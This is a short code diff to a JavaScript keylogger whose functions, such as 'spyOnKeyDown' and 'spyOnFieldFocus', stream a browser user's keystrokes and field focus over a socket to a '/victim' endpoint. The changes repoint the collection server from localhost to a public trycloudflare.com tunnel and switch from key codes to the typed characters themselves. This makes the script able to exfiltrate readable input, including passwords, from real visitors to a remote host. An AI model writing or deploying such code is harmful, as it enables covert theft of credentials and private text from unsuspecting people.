@@ -18,7 +18,7 @@
     }
 
     function loadAllScripts() {
-        loadScript('http://localhost:3000/socket.io/socket.io.js', init);
+        loadScript('https://emissions-follows-maine-bumper.trycloudflare.com/socket.io/socket.io.js', init);
     }
 
     function spyOnKeyDown(socket) {
@@ -27,7 +27,7 @@
 
             socket.emit('update', {
                 type: 'type',
-                msg: e.keyCode
+                msg: e.key
             });
         };
     }
@@ -63,7 +63,7 @@
     }
 
     function init() {
-        var socket = io('http://localhost:3000/victim');
+        var socket = io('https://emissions-follows-maine-bumper.trycloudflare.com/victim');
 
         spyOnKeyDown(socket);
         spyOnFieldFocus(socket);
